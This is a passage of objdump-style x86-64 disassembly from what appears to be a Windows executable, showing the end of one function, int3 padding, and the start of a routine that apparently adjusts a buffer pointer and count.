   1400051fb:	48 3b e8             	cmp    %rax,%rbp
   1400051fe:	77 d0                	ja     0x1400051d0
   140005200:	48 85 ff             	test   %rdi,%rdi
   140005203:	74 1a                	je     0x14000521f
   140005205:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   14000520c:	4c 8b c5             	mov    %rbp,%r8
   14000520f:	ba 01 00 00 00       	mov    $0x1,%edx
   140005214:	48 8b ce             	mov    %rsi,%rcx
   140005217:	e8 10 f4 00 00       	call   0x14001462c
   14000521c:	48 2b f8             	sub    %rax,%rdi
   14000521f:	4c 2b f7             	sub    %rdi,%r14
   140005222:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140005227:	49 8b c6             	mov    %r14,%rax
   14000522a:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   14000522f:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005234:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140005239:	48 83 c4 20          	add    $0x20,%rsp
   14000523d:	41 5e                	pop    %r14
   14000523f:	c3                   	ret
   140005240:	4c 2b f5             	sub    %rbp,%r14
   140005243:	eb dd                	jmp    0x140005222
   140005245:	cc                   	int3
   140005246:	cc                   	int3
   140005247:	cc                   	int3
   140005248:	cc                   	int3
   140005249:	cc                   	int3
   14000524a:	cc                   	int3
   14000524b:	cc                   	int3
   14000524c:	cc                   	int3
   14000524d:	cc                   	int3
   14000524e:	cc                   	int3
   14000524f:	cc                   	int3
   140005250:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140005255:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000525a:	55                   	push   %rbp
   14000525b:	48 8b ec             	mov    %rsp,%rbp
   14000525e:	48 83 ec 70          	sub    $0x70,%rsp
   140005262:	48 8b f9             	mov    %rcx,%rdi
   140005265:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140005269:	48 8b 08             	mov    (%rax),%rcx
   14000526c:	48 85 c9             	test   %rcx,%rcx
   14000526f:	74 39                	je     0x1400052aa
   140005271:	48 8b 57 50          	mov    0x50(%rdi),%rdx
   140005275:	4c 63 02             	movslq (%rdx),%r8
   140005278:	4a 8d 04 01          	lea    (%rcx,%r8,1),%rax
   14000527c:	48 3b c8             	cmp    %rax,%rcx
   14000527f:	73 29                	jae    0x1400052aa
   140005281:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   140005285:	89 02                	mov    %eax,(%rdx)
   140005287:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   14000528b:	48 8b 11             	mov    (%rcx),%rdx
